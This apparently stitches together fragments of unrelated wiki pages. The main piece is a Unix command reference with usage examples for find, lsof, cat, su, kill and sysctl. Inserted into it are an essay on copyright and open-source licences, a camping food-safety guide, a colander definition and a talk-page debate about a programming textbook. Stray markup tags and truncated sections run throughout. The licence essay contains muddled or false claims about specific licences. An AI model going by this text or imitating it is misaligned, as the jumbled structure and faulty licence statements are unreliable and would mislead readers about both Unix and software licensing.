Note: Each directive must be complete, tests cannot be omitted.  E.g. '''-name '*.txt' -o '*.doc' ''' (omitting the 2nd '''-name''') is not valid.

''Tips:''
Using 'exec' option executes certain commands for each file found by find:

 $ '''find . -name '*bak' -exec rm -i {} \;'''
 rm: remove regular empty file `./file1.bak'? y
 rm: remove regular empty file `./file2.bak'? y
 rm: remove regular empty file `./file3.bak'? y

Using 'ok' has same effect but it will prompt for every file:
 
 $ '''find . -name '*~' -ok rm {} \;'''
 &lt; rm ... ./RMAIL~ &gt; ? y

{{warning|When using &quot;-exec&quot; or &quot;-ok&quot;, a semicolon must be used to indicate the end of the arguments (to &quot;rm&quot; in the example). Because semicolon is special to the shell, it must be quoted. The above examples quote the semicolon with a backslash.}}

===whereis===
'''whereis''' searches the normal executable and man page locations for a specified file.

''Examples:'' 

 $ '''whereis ls'''  
 ls: /bin/ls /usr/bin/ls /usr/man/man1/ls.1.gz /usr/share/man/man1/ls.1.gz

===which===
'''which''' searches the locations in your PATH variable for a specified file. If you know a program is in your path (i.e. you can run it) this is faster than '''whereis'''.
 
 $ '''which pine'''
 /usr/bin/pineddd

===locate===
'''locate''' finds all filenames that match the specified query.

''Examples:''
 $ '''locate make.conf'''
 /etc/make.conf
 /etc/make.conf.orig
 /etc/make.conf.example
 /usr/qt/3/mkspecs/linux-g++/qmake.conf
 /usr/share/man/man5/make.conf.5.gz

'''locate''' however, is a GNU software and the command is not a standard in traditional UNIX systems like Solaris. The '''locate''' command comes standard with Linux based systems.

Note that '''locate''' uses a database of ''already collected'' filenames, that is typically updated once every 24 hours.  As such, using '''locate''' will not correctly show newly created or deleted files/directories.</text>

===fuser===
'''fuser''' tells you what process is using an indicated filesystem object (ordinary file, device, etc.)
 $ '''fuser /dev/dsp'''
 /dev/dsp:             8369

===lsof===
'''lsof'''  lists all open files,is more detailed than fuser.

''Example:''

 $ '''lsof /dev/dsp'''
 COMMAND  PID USER   FD   TYPE DEVICE SIZE NODE NAME
 mplayer 8406 alex    7w   CHR   14,3       389 /dev/sound/dsp

''Tips:''

Using -i 4 option will report all programs currently using IPv4 network, it is useful for watching the programs accessing the network and Internet resources.

 $ '''lsof -i 4'''
 COMMAND    PID   USER   FD   TYPE DEVICE SIZE NODE NAME
 btdownloa 2618 arky    3u  IPv4   9524       TCP *:6886 (LISTEN)
 btdownloa 2618 arky    6u  IPv4   9544       TCP  dsl-KK-229.53.101.203.ttel.net:1539-&gt;cpc1-leed3-3-0-cust10.ldst.cable.ntl.com:59074 (ESTABLISHED)

===fstat===
'''fstat''' lists all open files.

The previous two commands (fuser and lsof) do not exist on all systems. The 4.3BSD-Tahoe system introduced the &quot;fstat&quot; command that is found on many *BSD systems. Unlike the previous two commands, it seems not to know the exact path of each file, but only what filesystem it is on?

Some options are:
  -p PROCESSID  show open files of this process
  -u USERNAME   show open files of this user

''Examples:''
Lists every open file by every user, including root! Pipe it into a pager.
 $ '''fstat | less'''

Get the process ID of the running Bourne shell and then list the files it opened.
 $ '''echo $$'''
 5283
 $ '''fstat -p 5283'''
 USER     CMD          PID   FD MOUNT      INUM MODE       R/W    DV|SZ
 ...

The init process always has ID of 1. List its open files. In this example it only opened one file somewhere on the / filesystem.
 $ '''fstat -v -p 1'''
 USER     CMD          PID   FD MOUNT      INUM MODE       R/W    DV|SZ
 root     init           1   wd /             2 drwxr-xr-x   r      512

===cat===

'''cat''' displays the contents of a file to screen. It can also display multiple files con''cat''enated
together, and using the shell, its standard output can be redirected from the screen to the file.

Some useful options are:
 -n  line numbering
 -s  squeeze sequences of blank lines into one
 -v  show non-printing characters

''Examples''
 $ '''cat example.txt'''
 The contents of the file
 example.txt are now 
 displayed.

 $ '''cat -n example.txt'''
      1  The contents of the file
      2  example.txt are now
      3  displayed.

Concatenating multiple files (in this example, the same file twice):
 $ '''cat example.txt example.txt'''
 The contents of the file
 example.txt are now
 displayed.
 The contents of the file
 example.txt are now
 displayed.

Concatenate the files, but use the shell to redirect the result to a new file.
 $ '''cat example.txt example.txt &gt; double.txt'''

We can concatenate binary files, too. Some programs limit downloads to 2 GB; this is bad for larger files like some DVD images. Suppose a web site helpfully divides the file &quot;sodalinux.dvd&quot; into three parts, 2 GB or less, for downloading and later concatentation. We combine the files, and use the &gt; shell redirection output to put the DVD image in a file:
 $ '''cat sodalinux.dvd1 sodalinux.dvd2 sodalinux.dvd3 &gt; sodalinux.dvd'''

If we want to type less, then most shells also allow this:
 $ '''cat sodalinux.dvd{1,2,3} &gt; sodalinux.dvd'''

The -v option is useful for viewing control characters embedded mostly in text. In this example, the file &quot;/usr/share/man/cat1/pax.0&quot; is mostly text but contains control characters which the pagers &quot;less&quot; and &quot;more&quot; use to make text bold. Using cat -v we can see the control characters. Here are the first four lines:
 $ '''cat -v /usr/share/man/cat1/pax.0 | head -4'''
 PAX(1)                     OpenBSD Reference Manual                     PAX(1)
 
 N^HNA^HAM^HME^HE
      p^Hpa^Hax^Hx - read and write file archives and copy directory hierarchies

Using &quot;cat&quot; with no arguments makes it copy standard input to standard output. Combined with shell redirection, this makes it easy to write a very short text file. All one needs to know is to press Control-D (^D) to indicate end of input, finish the file, and return to the shell. Here is how to write &quot;example.txt&quot;:
 $ '''cat &gt; example.txt'''
 The contents of the file
 example.txt are now
 displayed.
 '''^D''' $

If you put &quot;cat&quot; with no arguments in a pipe, it only copies standard input to standard output. This might seem useless. For example, the following two pipes have the same function:
 $ '''dmesg | less'''
 $ '''dmesg | cat | less'''

However, &quot;cat&quot; can be used as insulation to make programs think that they are not running on terminals. In the next example, GNU bc does not print its copyright message on startup. We enter one calculation (&quot;3 + 9&quot;) and then quit (^D):
 $ '''bc | cat'''
 3 + 9
 12
 ^D

===tac===

'''tac''' (&lt;tt&gt;cat&lt;/tt&gt; spelled backwards) works like &lt;tt&gt;cat&lt;/tt&gt;, but reverse the order of the lines (last line is written out first).  When multiple files are given, they are printed out in the order they appear.

 $ '''tac foo'''
 Third Line
 Second Line
 First Line

===more===

'''more''' paginates output. The problem with &quot;cat&quot; is that if a file is too long, then it falls beyond the top of the screen. The job of &quot;more&quot; is to stop and wait when it fills the screen. Most users find it easier to use &quot;less&quot;, but on some systems &quot;more&quot; has all of the features of &quot;less&quot;.

''Keys:''
*''return'' read next line
*''space bar'' read next screen
*''q'' quit

''Examples:''
The pager will act like &quot;cat&quot; if the file is short enough.
  $ '''more hello.txt'''
  Hello World

===less===

'''less''' paginates output. The program is called &quot;less&quot; because of the joke that &quot;less is more&quot;, &quot;less&quot; actually has several features which &quot;more&quot; lacks.

''Keys:''
*''h'' read help. You might forget the other commands, but remember this one!
*''j'' go down one line. The down-arrow key might also work.
*''k'' go up one line. The up-arrow key might also work.
*''d'' go down one-half screen.
*''u'' go up one-half screen.
*''f'' go forward one screen.
*''b'' go back one screen.
*''p'' return to the top of the file.
*''q'' quit the pager.

''Number arguments:''
*''0'' through ''9'': type a number. The number will be used as the argument N to the next command.
*''j'' go down N lines.
*''k'' go up N lines.
*''p'' jump to the N% position, where 0% is the first line and 100% the last line of the file.

''Examples:''

Read some file:
 $ '''less example.txt'''

Pipe &quot;dmesg&quot; into &quot;less&quot; so that the dmesg does not scroll off the screen:
 $ '''dmesg | less'''

===od===
'''od''' is a utility that lets you view binary files.

''Examples:''

View a file in octal format:

 $ '''od wordlist.dat'''
 0000000 064506 071562 006564 051412 061545 067157 006544 040412
 0000020 070160 062554 005015 072522 061155 062554 005015 061501

View a file in hex format:

 $ '''od -x wordlist.dat'''
 0000000 6946 7372 0d74 530a 6365 6e6f 0d64 410a
 0000020 7070 656c 0a0d 7552 626d 656c 0a0d 6341

View a file in character format:

 $ '''od -c wordlist.dat'''
 0000000   F   i   r   s   t  \r  \n   S   e   c   o   n   d  \r  \n   A
 0000020   p   p   l   e  \r  \n   R   u   m   b   l   e  \r  \n

===head===

'''head''' displays 10 lines from the head (top) of a given file

''Examples:''

 $ '''head wordlist.dat'''
 First
 Second
 Third
 Fourth
 Fifth
 Sixth
 Seventh
 Eighth
 Ninth
 Tenth

Display the top two lines:
 
 $ '''head -2 wordlist.dat'''
 First
 Second

===tail===

'''tail''' displays last 10 lines of the file

''Examples:''

 $ '''tail wordlist.dat'''
 Ninety-First
 Ninety-Second
 Ninety-Third
 Ninety-Fourth
 Ninety-Fifth
 Ninety-Sixth
 Ninety-Seventh
 Ninety-Eighth
 Ninety-Ninth
 One Hundredth

Display the bottom two lines:
 
 $ '''tail -2 wordlist.dat''' 
 Ninety-Ninth
 One Hundredth

''Tips:''
The -f option displays the tail, then waits for and displays any new options to the file. This is normally used to watch log files. (The next example has only three lines from tail, but the 80-column terminal was too narrow, so the lines were broken into five lines.)
 $ '''tail -f /var/log/messages'''

      <text xml:space="preserve">Many people in this day and age still don't know much about the way that copyright works, so I will attempt to sum it up in as plain and concise a manner as possible.  When a work is made it is under the control of whoever made it, this work is exclusive to the creator and they are the only person with the ''right'' to ''copy'' it and unless permission is explicitly given noone has the right to copy or show the work at all for any reason.

If a person says that their work is licensed under the terms of the BSD license this is not enough to actually give permission to a person to use that work as though it were licensed BSD - the person licensing it must have the license accompanying the work, be it in another file or on another page at the same website.  Unless the work directly points to a copy of the license, there is no license, and the work is therefore not permitted to be copied.

Here is a list of several open source licenses approved by the Open Source Inititive, I have listed them from least to most open (most to least restrictive):

* The Bell Labs LPL (Lucent Public License) which is used for the release of Plan 9 restricts redistribution to countries which the United States holds sanctions against, this is viewed in a very negative light by many around the world because these people feel that politics and coding should not mix.

* The Sun CDDL (Common Development and Distribution License) which will cover the open source release of Solaris restricts one's ability to hold and maintain their own patents, this clause set is a matter of debate in online communities as on one hand it helps to prevent a company maliciously adding patented technology into software and suing users and distributors that make use of said software, on the other hand it is another restriction for what some view as no reason - it is implied by submitting code that you release your claim over any technologies involved.  If any entity that uses works licensed under the CDDL does sue entity that contributes to any project licensed under the CDDL, that license is automatically revoked as well.   These patent and revokation clauses are basically the only differences between the CDDL and the MPL.

* The Mozilla MPL (Mozilla Public License)

* The GNU GPL (General Public License) in a nutshell says that anything you distribute with GPL code must come with the code available as well and that you cannot make the code you release harder to read.  This is the basic &quot;viral license&quot;; once applied to code it cannot be relicensed without the permission of all contributors, thus it is viewed with great distaste by companies which are looking to make an easy profit.

* The GNU LGPL (Lesser General Public License)

* The Original BSD (Berkley Software Distribution) license allows for complete usage of any code for any purpose under the conditions that proper credit is given, the license remains in tact in any binary derivatives, any advertisements for derived works must list that the work contains code from the University of California, Berkley and it's contributors and that the names of contributors and the University can not be used to promote the derived work without written permission.  Pretty straight forward, no?

* The Modern BSD license dropped the condition of listing the University in advertisements, this was in part due to the number of various BSD-like licenses that were beginning to be used, they were beginning to fill up a fair amount of space in any advertisements which used multiple sources of code.

* The ISC (Internet Systems Consortium) license is basically a two-part BSD styled license which removes the fourth term where the names of contributors and copyright holders cannot have their name used in promotions without prior written consent.  This is because in 1971 the Berne convention set down this term as standard for all copyrighted works.

There is another option beyond licensing a work, the creator may state that the work in question is released to the public domain, the public domain is the property of anyone that wants to use it and there are no restrictions what so ever on the work; there is no further need for permissions, no credit need be given, it is no longer the property of the creator alone.  This does not, however, function globally, though this anti-licence is accepted within some nations, others do not allow for the release of property in this manner, and thus a content creator must create a licence that recreates the terms of the public domain and release their source code under it.

===file===
'''file''' displays the file type. To get the mimetype, use the -i option.

''Examples''

 $ '''file Unix.txt'''
 Unix.txt: ASCII text

 $ '''file -i Unix.txt'''
 Unix.txt: text/plain; charset=us-ascii

===wc===

'''wc''' tells you the number of lines, words and characters in a file.

''Examples:''
 $ '''wc hello.txt'''
 2       6      29 hello.txt

 $ '''wc -l hello.txt'''
 2 hello.txt

 $ '''wc -w hello.txt'''
 6 hello.txt

 $ '''wc -c hello.txt'''
 29 hello.txt

===cksum===

'''cksum''' gives you the CRC checksum of some files.

Checksums can be used to protect against accidental modifications to files: if the checksum has not changed, then the file is probably undamaged. The default CRC checksum is not cryptographic.

Cryptographic checksums are those checksums which protect against both accidental modifications and malicious modifications. Use these to verify that there is no trojan inserted into your file. The &quot;md5&quot; algorithm is beginning to show weaknesses against attacks, so &quot;sha1&quot; is preferred.

''Examples:''
 $ '''cksum /etc/passwd'''
 3052342160 2119 /etc/passwd

Some &quot;cksum&quot; implementations provide other algorithms, such as &quot;md5&quot; and &quot;sha1&quot;:
 $ '''cksum -a sha1 /etc/passwd'''
 SHA1 (/etc/passwd) = 816d937ca4cdb4dee92d5002610fae63b639d224

Some &quot;cksum&quot; implementations let you take checksums of strings specified as arguments:
 $ cksum -s 'Guide to UNIX'
 2195826759 13 Guide to UNIX
 $ cksum -a sha1 -s 'Guide to UNIX'
 SHA1 (&quot;Guide to UNIX&quot;) = 0e9c1779e61c7fdb473d2e55eb878a82c37eecea</text>

===who===

'''who''' gives information about the users logged into the machine. The information includes the user's terminal, login date ,login time and the location they are connecting from.

''Examples:''

 $ '''who'''
 alice    pts/0        Mar 23 08:05 (213.23.423.24)
 bob      pts/2        Apr 10 22:06 (domain.aol.com)
 carol    pts/3        Apr 10 18:34 (space.com)

The option &quot;-w&quot; shows wheter or not a user's tty is accessible with commands like '''write''' or '''talk'''.  '''+''' indicates that the tty is accessible, and '''-''' that it's not:

 $ '''who -w'''
 root     - tty3         Jan 19 02:26
 koppe    - tty4         Jan 19 17:10
 bok      + pts/1        Jan 19 23:03 

Using &quot;who&quot; with two non-option words gives your username. On some systems, this gives your actual username, and using &quot;su&quot; or &quot;sudo&quot; to switch user does not change this name.
 $ '''who am i'''
 puffy

On other systems, this gives more information:
 $ '''who am i'''
 puffy    ttyp2    Oct 27 10:08

===finger===

'''finger''' finds out information about a user. If the user has created a .plan (several lines) and/or a .project (one line) file in their home directory this will also be displayed.

''Examples:''

 $ '''finger alice'''
 Login: alice                    Name: Alice Makemerry
 Directory: /home/alice          Shell: /bin/bash
 On since Sat Apr 10 18:34 (BST) on pts/3 from ip.fakedomain.com              
   1 hour 25 minutes idle
 Mail last read Sat Apr 10 23:57 2004 (BST)
 No Plan.

===su===

'''su''' switch user

''Examples:''

''Become another user:''
 
 user&gt; '''su bob'''
 Password: 
 bob&gt;

Become ''root''... then become another user:

 user&gt; '''su'''
 Password:
 root#
 root# '''su bob'''
 bob&gt;
 (Note: ''root'' is not asked for password to become ''bob''!) 

Switching user and using the new user's environment (shell, shell-variables, home-directory) as if after a normal log-in:

 user&gt; '''su - bob'''
 Password:
 bob$

Run a program as another user (as ''root'' unless otherwise specified):

 user&gt; '''su -c 'apt-get update' '''
 Password:

Note: The permission and owner/group of '''su''' - as well as other config-files (typically ''/etc/su'' and ''/etc/login.defs'') - may prevent users not belonging to certain groups from switching user even with the correct password, or even being able to execute '''su''' at all (E.g. in BSD it's traditionally been restricted to members of the ''wheel''-group only).</text>

===whoami===

'''whoami''' tells you your current username.

''Examples:''
 
 $ '''whoami'''
 abicool

===groups===

'''groups''' states the groups the current user is a member of

''Examples:''

 $ '''groups'''
 wheel slocate www

===id===
'''id''' gives you the same information as the '''whoami''' and '''groups''' commands, but also includes the user id (uid) and group id (gid) integers associated with the login.

''Examples:''

 $ '''id'''

===uptime===
'''uptime''' tells you how long the computer has been running since its last reboot or power-off.

''Example:''

 $ '''uptime'''
 22:27:49 up 10:14,  2 users,  load average: 0.03, 0.32, 0.28

===uname===

'''uname''' displays the system information such as hardware platform,system name and  processor, Operating System type.

''Example:'' 
  
 $ '''uname -a'''
 Linux DarkBox 2.4.27-1-k6 #1 Wed Apr 14 19:00:29 UTC 2004 i586 GNU/Linux
===dmesg===
'''dmesg''' display the messages from the kernel, since boot.
 
''Example:''

 $ '''dmesg'''

''Tips:''

While a UNIX system is booting, usually a lot of messages flash on the console screen in rapid succession; to view those messages after the system is booted, use the following command:

 $ '''dmesg | less'''

Using a command option, '''dmesg''' can filter the kernel messages, based on priority.  The '-n 1' arguments will display only the panic messages:

 $ '''dmesg -n 1'''

===free===
'''free''' display used and free memory 

''Example:''

 $ '''free''' 
              total       used       free     shared    buffers     cached
 Mem:        123260     119540       3720          0       8752      58096
 -/+ buffers/cache:      52692      70568
 Swap:       369452      63212     306240

Display in human readable form using MegaByte block sizes:

 $ '''free -m'''
              total       used       free     shared    buffers     cached
 Mem:           120        116          3          0          8         56
 -/+ buffers/cache:         51         68
 Swap:          360         61        299

''Tips:''
Display system memory usage every 5 seconds, use Ctl+c to exit:
 $ '''free -m -s 5'''
              total       used       free     shared    buffers     cached
 Mem:           120        116          3          0          8         56

===vmstat===
'''vmstat''' displays a compact summary of overall system activity (processes, memory, and cpu information).


''Example:''
 $ '''vmstat'''
 procs -----------memory---------- ---swap-- -----io---- --system-- ----cpu----
  r  b   swpd   free   buff  cache   si   so    bi    bo   in    cs us sy id wa

===nohup===
'''nohup''' lets you run a program in a way which makes it ignore hangup signals. This can be used to make a program continue running after a user has logged out. The output of the program is redirected from the standard output to the file nohup.out.

''Examples:''

 $ '''nohup wget http://foo.org/foo_list.gz'''
 nohup: appending output to `nohup.out'
 $

===ps===
'''ps''' displays a list of current processes and their properties.

''Examples:''

Processes owned by the current user:

 $ '''ps'''
   PID TTY          TIME CMD
 17525 pts/0    00:00:00 su
 17528 pts/0    00:00:00 bash
 17590 pts/0    00:00:00 ps where pid is process id.

All processes:

 $ '''ps -A'''

===kill===
'''kill''' is used to send termination signals to processes.

''Examples''

To send the kill signal to the processes with process id 17525,

 $ '''kill -9 17525'''

To send the kill signal to all processes,

 $ '''kill -9 -1'''

see [[Guide to Unix/Commands/Process Management/Kill]]

===pgrep===

===lsmod===
'''lsmod''' lists the modules loaded by the Linux kernel.

===modprobe===
'''modprobe''' loads a Linux kernel module. You can specify only the name of the module, and modprobe will load it from the correct location and also load any dependent modules.

Many modules load automatically. For example, Linux loads a USB keyboard module when a USB keyboard is attached. It also loads the base USB modules as dependencies. Some modules must be loaded manually, and &quot;modprobe&quot; is the easiest way to do this.

===sysctl===
'''sysctl''' sets a parameter to change the behavior of the kernel. The available parameters vary by kernel, so check the man page for sysctl in your distribution.

''Examples:''

Check the setting for the &quot;vm.swapencrypt.enable&quot; parameter:

 $ '''sysctl vm.swapencrypt.enable'''
 vm.swapencrypt.enable=0

Root can set the parameter to 1.

 $ '''sysctl vm.swapencrypt.enable=1'''
 vm.swapencrypt.enable: 0 -&gt; 1</text>

Sometimes you just have to get out and walk around in the solitude and beauty of the country. You may want to hike for just a few hours, or you may want to hike for a few days. One meal and some snacks are all that’s needed for a short hike. Planning meals for a longer hike requires more thought. You have to choose foods that are light enough to carry in a backpack and that can be transported safely.

==Hot or Cold?==
The first principle is to keep foods either hot or cold. Since it is difficult to keep foods hot without a heat source (although the new insulated casserole dishes will keep things hot for an hour or so), it is best to transport chilled foods. Refrigerate or freeze the food overnight. For a cold source, bring frozen gel-packs or freeze some box drinks. The drinks will thaw as you hike and keep your meal cold at the same time. What foods to bring? For a day hike, just about anything will do as long as you can fit it in your backpack and keep it cold – sandwiches, fried chicken, bread and cheese, and even salads – or choose non-perishable foods.

==Clean==
The second principle is to keep everything clean, so remember to bring disposable wipes if you are taking a day trip. (Water is too heavy to bring enough for cleaning dishes!)

==Safe Drinking Water==
It is not a good idea to depend on fresh water from a lake or stream for drinking, no matter how clean it appears. Some pathogens thrive in remote mountain lakes or streams and there is no way to know what might have fallen into the water upstream. Bring bottled or tap water for drinking. Always start out with a full water bottle, and replenish your supply from tested public systems when possible. On long trips you can find water in streams, lakes, and springs, but be sure to purify any water from the wild, no matter how clean it appears.

The surest way to make water safe is to [[Cookbook:Boiling|boil]] it. Boiling will kill microorganisms. First, bring water to a rolling boil, and then continue boiling for 1 minute. Before heating, muddy water should be allowed to stand for a while to allow the silt to settle to the bottom. Dip the clear water off the top and boil. At higher elevations, where the boiling point of water is lower, boil for several minutes.

As an alternative to boiling water, you can also use water purification tablets and water filters. The purification tablets – which contain iodine, halazone, or chlorine – kill most waterborne bacteria, viruses, and some (but not all) parasites. Because some parasites – such as ''Cryptosporidium parvum'', ''Giardia lamblia'', and larger bacteria – are not killed by purification tablets, you must also use a water filter. These water filtering devices must be 1 micron absolute or smaller. Over time purification tablets lose their potency, so keep your supply fresh. Water sanitizing tablets for washing dishes can also be purchased (just don’t confuse the two). Water purification tablets, filters, and sanitizing tablets can be purchased at camping supply stores.

==What Foods to Bring?==
If you are backpacking for more than a day, the food situation gets a little more complicated. You can still bring cold foods for the first day, but you’ll have to pack shelf-stable items for the next day. Canned goods are safe, but heavy, so plan your menu carefully. Advances in food technology have produced relatively lightweight staples that don’t need refrigeration or careful packaging. For example:

* [[Cookbook:Peanut Butter|peanut butter]] in plastic jars;
* concentrated juice boxes;
* canned [[Cookbook:Tuna|tuna]], [[Cookbook:Ham|ham]], [[Cookbook:Chicken|chicken]], and [[Cookbook:Beef|beef]];.
* dried noodles and [[Cookbook:Soup|soups]];
* beef jerky and other dried meats;
* dehydrated foods;
* dried [[Cookbook:Fruit|fruits]] and [[Cookbook:Nut|nuts]]; and
* [[Cookbook:Milk|powdered milk]] and fruit drinks.


Powdered mixes for biscuits or pancakes are easy to carry and prepare, as is dried [[Cookbook:Pasta|pasta]]. There are plenty of powdered sauce mixes that can be used over pasta, but check the required ingredient list. Carry items like dried pasta, [[Cookbook:Rice|rice]], and baking mixes in plastic bags and take only the amount you’ll need.

==Cooking at Camp==
After you have decided on a menu, you need to plan how you will prepare the food. You’ll want to take as few pots as possible (they’re heavy!). Camping supply stores sell lightweight cooking gear that nest together, but you can also use aluminum foil wrap and pans for cooking.

You’ll need to decide in advance how you will cook. Will you bring along a portable stove, or will you build a campfire? Many camping areas prohibit campfires, so check first or assume you will have to take a stove. Make sure to bring any equipment you will need. If you are bringing a camp stove, practice putting it together and lighting it before you pack. If you build a campfire, carefully extinguish the fire and dispose of the ashes before breaking camp. Likewise, leftover food should be burned, not dumped. Lastly, be sure to pack garbage bags to dispose of any other trash, and carry it out with you.

==Use a Food Thermometer==
Another important piece of camping equipment is a food thermometer. If you are cooking meat or poultry on a portable stove or over a fire, you’ll need a way to determine when it is done and safe to eat. Color is not a reliable indicator of doneness, and it can be especially tricky to tell the color of a food if you are cooking in a wooded area in the evening.

When cooking hamburger patties on a grill or portable stove, use a digital thermometer to measure the temperature. Digital thermometers register the temperature in the very tip of the probe, so the safety of thin foods -- such as hamburger patties and boneless chicken breasts -- as well as thicker foods can be determined. A dial thermometer determines the temperature of a food by averaging the temperature along the stem and, therefore, should be inserted 2 to 2 ½ inches into the food. If the food is thin, the probe must be inserted sideways into the food.

It is critical to use a food thermometer when cooking hamburgers. Ground beef may be contaminated with ''E. coli'' O157:H7, a particularly dangerous strain of bacteria. Illnesses have occurred even when ground beef patties were cooked until there was no visible pink. The only way to insure that ground beef patties are safely cooked is to use a food thermometer, and cook the patty until it reaches 160 °F. For chicken, cook breasts or cutlets to 170 °F; legs and thighs to 180 °F. [[Cookbook:Pork|Pork]] should be cooked to 160 °F. Heat hot dogs and any leftover food to 165 °F. Be sure to clean the thermometer between uses.

==Keeping Cold==
If you are &quot;car camping&quot; (driving to your site), you don’t have quite as many restrictions. First, you will have the luxury of bringing a cooler. What kind of cooler? Foam chests are lightweight, low cost, and have good &quot;cold retention&quot; power. But they are fragile and may not last through numerous outings. Plastic, fiberglass, or steel coolers are more durable and can take a lot of outdoor wear. They also have excellent &quot;cold retention&quot; power, but, once filled, larger models may weigh 30 or 40 pounds.

To keep foods cold, you’ll need a cold source. A block of ice keeps longer than ice cubes. Before leaving home, freeze clean, empty milk cartons filled with water to make blocks of ice, or use frozen gel-packs. Fill the cooler with cold or frozen foods. Pack foods in reverse order. First foods packed should be the last foods used. (There is one exception: pack raw meat or poultry below ready-to-eat foods to prevent raw meat or poultry juices from dripping on the other foods.) Take foods in the smallest quantity needed (e.g., a small jar of mayonnaise). At the campsite, insulate the cooler with a blanket, tarp, or poncho. When the camping trip is over, discard all perishable foods if there is no longer ice in the cooler or if the gel-pack is no longer frozen.

==Cleanup==
Whether taking a hike or camping at an established site, if you will be washing dishes or cookware, there are some rules to follow. Camping supply stores sell biodegradable camping soap in liquid and solid forms. But use it sparingly, and keep it out of rivers, lakes, streams, and springs, as it will pollute. If you use soap to clean your pots, wash the pots at the campsite, not at the water’s edge. Dump dirty water on dry ground, well away from fresh water. Some wilderness campers use [[Cookbook:Baking Soda|baking soda]] to wash their utensils. Pack disposable wipes for hands and quick cleanups.

===sync===
'''sync''' write memory buffers to disk

''Example:''
Sync has no options, doesn't display any messages
 $ '''sync''' 

''Tips:'' 

It is always good to type sync a couple of times, one the important functions of ''sync'' is to update your superblock information.

The ''sync'' calls sync Unix system call and exits with success code '0' or '1' if it fails. These exit codes stored in $? variable.

 $ '''sync'''
 $ '''echo $?'''
  0 
The above example shows that ''sync'' was successful.

===echo===
'''echo''' outputs its parameters to the standard output.

''Examples:''
 
 $ '''echo &quot;hello world&quot;'''
 hello world

''Tips:''
Some common echo usage:

Check a shell variable:
 $ '''echo $EDITOR'''
 emacs

Check the parameters passed in the previous command:
 $ '''ls -l''' 
  .........
 $ '''echo $_'''
 -l

Check the current parent process:
 $ '''echo $0'''
 bash
Check the exit code of the last command: 
 $ '''echo $?'''
 0

Create a empty file (same as &lt;tt&gt;'''touch /tmp/newfile'''&lt;/tt&gt;):
 $ '''echo &quot;&quot; &gt; /tmp/newfile'''

Create a new file with some text:
 $ '''echo &quot;exec fluxbox&quot; &gt; ~/.xinitrc'''

Add (append) a new line to end of file:

 $ '''echo &quot;A New Line&quot; &gt;&gt; /tmp/newfile'''

===cal===

'''cal''' displays a calender for the current month. If the command is followed by a date (a month or a year) it will return a calender for that period.

''Examples:''

 $ '''cal''' 
      April 2004
 Su Mo Tu We Th Fr Sa 
              1  2  3
  4  5  6  7  8  9 10
 11 12 13 14 15 16 17
 18 19 20 21 22 23 24
 25 26 27 28 29 30

 $ '''cal 01 2007'''
     January 2007
 Su Mo Tu We Th Fr Sa 
     1  2  3  4  5  6
  7  8  9 10 11 12 13
 14 15 16 17 18 19 20
 21 22 23 24 25 26 27
 28 29 30 31

 $ '''cal -3'''
 Shows current, previous and next month (default on some implementations)

 $ '''cal -3 04 2004'''
 Shows April 2004, as well as the previous (March) and following (May) month

 $ '''cal -1'''
 Shows the current month (default on some implementations)

 $ '''cal 2004'''
 Shows a calendar for the ''whole year'' 2004

 $ '''cal -j'''
 Shows this months calendar with ''day-of-year number'' (counted from January 1st) rather than the date

''Tips:''
The [[Gregorian Calendar]] was adopted in the [[British Empire]] in 1752. The 2nd day of September 1752 was immediately followed by the 14th day of September, as shown by the example below.
 
 $ '''cal 9 1752'''
   September 1752   
 Su Mo Tu We Th Fr Sa
        1  2 14 15 16
 17 18 19 20 21 22 23
 24 25 26 27 28 29 30

===date===

Count the number of mail in your mailbox
 $ '''from -c'''
 There are 2 messages in your incoming mailbox.

===mail===
'''mail''' allows you to read and write emails.

''Example:''
 
 $ '''mail'''
 No mail for user.
 $ '''mail user2'''
 Subject: '''What's up?'''
 '''Hi user2, you can delete this rubbish by pressing 'd'.'''
 Cc: '''user'''

''Tips:''
Note that you need to press enter then ctrl+d to confirm.

 $ '''mail'''
 Mail version 8.1 6/6/93. Type ? for help.
 &quot;/var/spool/mail/user&quot;: 1 message 1 new
 &gt;N 1 user@unix.com Tue Jun 27 12:34 16/674 &quot;What's up?&quot;
 &amp;

''Tips:'' Press enter to read.

===clear===
'''clear''' clears the screen.

''Example:''
 $

===PS1===

[[Image:Sita kuchenne.jpg|right|thumb|Colander (right) with other sieves]]

A '''colander''' is a large perforated bowl used to drain foods. It generally has a stand, so that it can be set to stand in a sink or larger bowl, allowing liquids to drain out the bottom and sides. Colanders are usually made from light-weight metal, such as aluminium or thinly rolled stainless steel, but are sometimes made from enamelled iron, ceramics, or plastic.</text>

== Cleanup-clarity ==

Too many advocates for too many programming languages have made attemts to make ''their'' programming language choosen - and I won't exclude myself from that list.

As a result the text is now very confusing to a reader looking for advice on what language to learn - .

I have changed the [[Computer_programming#Programming_Languages|Programming_Languages]] chapter to be a platform for language advocates to be heard. I suggest we allow only a short text per language on the sole subject of &quot;Why '''learn'''  this language&quot;.

All language advocacy from the chapter [[Computer_programming#Choosing_a_programming_language|Choosing_a_programming_language]] should be removed and be replaced by a more neutral poins of view.

=== Fundamental decisions ===

I agree with the top bit. Basically, this book is suffering from too-many-cooks syndrome.  

Now, what I will argue is that our job here is to teach beginners how to program, and that anything which does not teach beginners how to program should be swept away.  I will also argue that complete neutrality is going to be very unhelpful.  While we do not want to fall into petty advocacy (use this compiler! use that!) we must do '''some''' steering.  Instead of complete NPOV, I think we should should establish a rough consensus on the fundamental vision of our book.  I'll start with some ideas and hope you folks make other proposals as well. -- [[User:Kowey|Kowey]] 10:23, 9 Feb 2005 (UTC)

==== Advocates Playground ====

For the steering I have changed the layout of the [[Computer_programming#Programming_Languages|Programming Languages]] chapter from simple list to definition list. If it is feelt that the definition list is still to tight for describing the languages whe can change to chapter layout.

Suitable teaching languages can describe themself without interfering with the main text or the description of other languages. The reader becomes a - hopefully - clear description an can then make an informed desicion.

Removing any reference to any language in all the other chapters will discurage &quot;shame-less-plugs&quot; - if somebody feals to need to advocate a language he/she will need to do properly in chapter 4.

--[[User:Krischik|Krischik]] 11:48, 9 Feb 2005 (UTC)

=== Kowey's proposal ===

* Ditch the whole &quot;What language should I learn thing&quot;... or at least, make it one of the last chapters in the book.  Now that you have one or two ideas about programming, why don't you learn some other languages?
* Teach fundamental notions: recursion, etc
* Select one teaching language. I argue that the criteria to focus on is not how &quot;useful&quot; the language is, but how clearly we can communicate the fundamental concepts with it. Now this doesn't mean we don't mention the other languages, or say that this language is better than others,  just that we choose to teach in that language.
** I say we go for [[Programming:Caml|Caml]] or [[Programming:Python|Python]] because users can get going right away without lots of confusing syntactic cruft.
* ... more later

